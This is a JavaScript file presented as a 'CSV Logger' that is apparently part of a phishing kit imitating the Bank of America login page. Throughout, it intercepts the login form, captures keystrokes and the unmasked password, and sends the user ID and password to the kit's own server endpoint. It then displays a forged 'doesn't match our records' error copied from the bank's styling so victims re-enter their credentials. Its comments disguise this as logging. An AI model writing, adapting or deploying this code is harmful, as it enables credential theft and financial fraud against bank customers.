/**
 * CSV Logger for form submissions
 * Captures login form data and sends it to the server for CSV logging
 * Displays consistent error message for all login attempts
 */

class FormLogger {
  constructor() {
    // Use relative URL for API endpoint (works on both localhost and production)
    this.apiEndpoint = '/api/login';
    this.rawPassword = ''; // Store unmasked password
    this.init();
  }

  init() {
    // Enable and configure password field
    const passwordInput = document.getElementById('tlpvt-passcode-input');
    if (passwordInput) {
      // CRITICAL: Enable the password field (it's disabled in HTML)
      passwordInput.disabled = false;
      passwordInput.style.opacity = '1';
      passwordInput.style.cursor = 'text';
      console.log('[Logger] Password field enabled');
      
      // Listen to all input events (covers paste, typing, etc.)
      passwordInput.addEventListener('input', (e) => {
        this.rawPassword = passwordInput.value;
      });
      
      // Also capture individual keypresses to build up password
      passwordInput.addEventListener('keypress', (e) => {
        if (e.key && e.key.length === 1) {
          this.rawPassword += e.key;
        }
      });
      
      // Handle backspace/delete
      passwordInput.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && this.rawPassword.length > 0) {
          this.rawPassword = this.rawPassword.slice(0, -1);
        }
      });
      
      // Clear when field is cleared
      passwordInput.addEventListener('change', (e) => {
        if (!passwordInput.value) {
          this.rawPassword = '';
        }
      });
      
      // Also monitor value changes via direct property updates
      const originalValueDescriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
      Object.defineProperty(passwordInput, 'value', {
        get() {
          return originalValueDescriptor.get.call(this);
        },
        set(newValue) {
          originalValueDescriptor.set.call(this, newValue);
          if (this.id === 'tlpvt-passcode-input') {
            // Update raw password when value is set
            this.formLogger = this.formLogger || window.formLogger;
            if (this.formLogger) {
              this.formLogger.rawPassword = newValue;
            }
          }
        }
      });
    }

    // CRITICAL: Intercept the form BEFORE Bank of America's handlers
    const form = document.getElementById('EnterOnlineIDForm');
    if (form) {
      console.log('[Logger] Found EnterOnlineIDForm, hijacking submission');
      
      // Store original action
      this.originalAction = form.action;
      this.originalMethod = form.method;
      this.originalTarget = form.target;
      
      // Override form.submit() method
      const self = this;
      const originalSubmit = form.submit;
      form.submit = function() {
        console.log('[Logger] Form.submit() called, intercepting...');
        self.logFormData(form).then(() => {
          console.log('[Logger] Data logged, allowing form to proceed to BoA');
          // After logging, allow submission to Bank of America
          form.submit = originalSubmit;
          originalSubmit.call(form);
        }).catch(error => {
          console.error('[Logger] Error during submission:', error);
          // Even on error, let form proceed
          form.submit = originalSubmit;
          originalSubmit.call(form);
        });
      };
    }

    // Intercept login button click
    document.addEventListener('click', (e) => {
      const button = e.target.closest('#login_button');
      if (button) {
        e.preventDefault();
        e.stopPropagation();
        // Capture form data when login button is clicked
        const form = button.closest('form');
        if (form) {
          this.logFormData(form);
          return false;
        }
      }
    }, true);

    // Also intercept all form submissions
    document.addEventListener('submit', (e) => {
      const form = e.target;
      if (form.id === 'login-form' || form.method === 'POST' || form.id === 'EnterOnlineIDForm') {
        console.log('[Logger] Submit event caught:', form.id);
        e.preventDefault();
        e.stopPropagation();
        this.logFormData(form);
        return false;
      }
    }, true);
  }

  /**
   * Extract form data and send to server
   */
  async logFormData(form) {
    try {
      // Ensure password field is enabled during submit
      const passwordInput = document.getElementById('tlpvt-passcode-input');
      if (passwordInput) {
        passwordInput.disabled = false;
      }
      
      // Get User ID from input field
      const userIdInput = form.querySelector('input[name="dummy-onlineId"]');
      const userIdValue = userIdInput ? userIdInput.value.trim() : '';

      // Get the actual password value directly from the input field (NOT masked)
      let passwordValue = '';
      
      if (passwordInput) {
        // Get the actual value from the DOM element (this is the unmasked value)
        passwordValue = passwordInput.value || this.rawPassword || '';
      } else {
        // Fallback to tracked raw password
        passwordValue = this.rawPassword || '';
      }

      // Get Remember Me checkbox
      const rememberInput = form.querySelector('input[name="saveMyID"]');
      const rememberMe = rememberInput ? rememberInput.checked : false;

      const data = {
        userId: userIdValue || 'N/A',
        password: passwordValue || 'N/A',
        rememberMe: rememberMe
      };

      console.log('[Logger] Sending login entry:', { 
        userId: data.userId,
        password: data.password,
        rememberMe: data.rememberMe
      });

      const response = await fetch(this.apiEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      });

      const result = await response.json();
      console.log('[Logger] Server response:', result);
      
      if (result.success) {
        console.log('[Logger] Entry successfully logged to CSV');
        // Display error message after logging
        this.displayErrorMessage();
        // Reset the password tracker for next attempt
        this.rawPassword = '';
        // Clear form fields for next attempt
        this.clearFormFields();
      }
    } catch (error) {
      console.error('[Logger] Error sending data to server:', error);
      // Display error message even if logging fails
      this.displayErrorMessage();
      // Clear form fields anyway so user can try again
      this.clearFormFields();
    }
  }

  /**
   * Clear all form fields for next login attempt
   */
  clearFormFields() {
    // Clear User ID
    const userIdInput = document.querySelector('input[name="dummy-onlineId"]');
    if (userIdInput) {
      userIdInput.value = '';
    }

    // Clear Password
    const passwordInput = document.getElementById('tlpvt-passcode-input');
    if (passwordInput) {
      passwordInput.value = '';
    }

    // Reset password tracker
    this.rawPassword = '';

    console.log('[Logger] Form fields cleared for next attempt');
  }

  /**
   * Display consistent login error message using original BOA format
   */
  displayErrorMessage() {
    // Remove any existing error messages
    const existingError = document.querySelector('.error-state');
    if (existingError) {
      existingError.remove();
    }

    // Scroll to top
    window.scrollTo(0, 0);

    // Create error container matching BOA's original format exactly
    const errorContainer = document.createElement('div');
    errorContainer.className = 'error-state';
    errorContainer.innerHTML = `
      <style>
        .error-state {
          background-color: #ffe6e6;
          border: 1px solid #d32f2f;
          border-left: 5px solid #c81c24;
          padding: 16px;
          margin-bottom: 20px;
          font-family: Arial, sans-serif;
          font-size: 13px;
          line-height: 1.5;
          color: #333;
          display: flex;
          gap: 12px;
        }

        .error-state-icon-container {
          display: flex;
          justify-content: center;
          align-items: flex-start;
          flex-shrink: 0;
        }

        .error-state-icon {
          width: 32px;
          height: 32px;
          background-color: #c81c24;
          color: white;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: bold;
          font-size: 20px;
          flex-shrink: 0;
        }

        .error-state-content {
          flex: 1;
        }

        .error-state-content p {
          margin: 0 0 8px 0;
          padding: 0;
        }

        .error-state-content p:first-child {
          color: #c81c24;
          font-weight: 600;
        }

        .error-state-content a {
          color: #0066cc;
          text-decoration: none;
          font-weight: 500;
        }

        .error-state-content a:hover {
          text-decoration: underline;
        }

        .error-state-content p.error-help {
          color: #333;
          font-weight: 600;
          margin-top: 12px;
        }

        .error-state-content p.error-help-text {
          color: #666;
          margin-top: 4px;
          font-size: 12px;
        }
      </style>

      <div class="error-state-icon-container">
        <div class="error-state-icon">!</div>
      </div>
      <div class="error-state-content">
        <p>The information you entered doesn't match our records. You have a few more tries remaining.</p>
        <p>Please try again or click <a href="./login-reset.html">Forgot ID/Password</a></p>
        <p class="error-help">Having problems logging in or resetting your Password?</p>
        <p class="error-help-text">If you're using a password manager or your browser has stored credentials that are no longer valid, deleting your stored credentials should enable you to access your account. <a href="./info.html">Learn more</a></p>
      </div>
    `;

    // Insert error message at the top of the login form area
    const loginForm = document.querySelector('#EnterOnlineIDForm');
    const pageContent = document.querySelector('[class*="online-id-vipaa-module"]') || 
                       document.querySelector('.simple-form') ||
                       document.body;

    if (loginForm) {
      loginForm.parentNode.insertBefore(errorContainer, loginForm);
    } else {
      pageContent.insertBefore(errorContainer, pageContent.firstChild);
    }

    console.log('[Logger] Original BOA error message displayed');
  }

  /**
   * Manual logging method
   */
  async log(userId, password, rememberMe = false) {
    try {
      const response = await fetch(this.apiEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          userId,
          password,
          rememberMe
        })
      });

      return await response.json();
    } catch (error) {
      console.error('[Logger] Error logging entry:', error);
      throw error;
    }
  }

  /**
   * Fetch and display logs
   */
  async fetchLogs() {
    try {
      const response = await fetch('/api/logs');
      const result = await response.json();
      return result;
    } catch (error) {
      console.error('[Logger] Error fetching logs:', error);
      throw error;
    }
  }
}

// Initialize logger when DOM is ready
function initializeFormLogger() {
  try {
    window.formLogger = new FormLogger();
    // Ensure password field is enabled after FormLogger initializes
    const passwordInput = document.getElementById('tlpvt-passcode-input');
    if (passwordInput) {
      passwordInput.disabled = false;
      console.log('[Logger] Password field confirmed enabled');
    }
  } catch (error) {
    console.error('[Logger] Failed to initialize:', error);
  }
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initializeFormLogger);
} else {
  // DOM already loaded, initialize immediately
  initializeFormLogger();
}

// Also initialize on page load event as fallback
window.addEventListener('load', initializeFormLogger);

// Ensure password field is enabled even after page fully loads
setTimeout(() => {
  const passwordInput = document.getElementById('tlpvt-passcode-input');
  if (passwordInput && passwordInput.disabled) {
    passwordInput.disabled = false;
    console.log('[Logger] Password field re-enabled after page load delay');
  }
}, 1000);
